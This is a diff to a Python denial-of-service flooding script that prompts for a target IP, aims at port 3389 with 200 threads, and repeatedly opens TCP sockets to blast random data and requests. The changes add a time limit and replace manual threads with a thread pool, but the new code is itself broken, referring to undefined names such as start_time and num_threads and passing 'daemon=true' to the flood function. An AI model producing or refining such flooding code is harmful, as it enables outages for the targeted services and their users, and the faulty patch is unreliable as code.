@@ -2376,7 +2376,7 @@ print("------------------------------------------------")
 ip = str(input("IP:"))
 port = int("3389")
 method = str("TCP")
-times = int("50000")
+duration = int("50000")
 threads = int("200")
 time.sleep(5)
 print("[0] Checking IP ..........")
@@ -2454,7 +2454,7 @@ def ddos():
     data = random._urandom(1067)
     data1 = random._urandom(1166)
     data2 = random._urandom(1279)
-    while True:
+    while time.time() - start_time < duration:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
@@ -2509,7 +2509,7 @@ def ddos():
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
             s.sendall(str.encode(request))
-            for x in range(6000000998989898989888909898989898):
+            for x in range(600000099888909898989898):
                 s.send(data)
                 s.send(data)
                 s.send(data)
@@ -2547,6 +2547,8 @@ def ddos():
         except :
             s.close()
 
-for y in range(threads):
-    th = threading.Thread(target = ddos,daemon=True)
-    th.start()
+with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+    for _ in range(num_threads):
+        executor.submit(ddos, daemon=true)
+
+print("finished.")
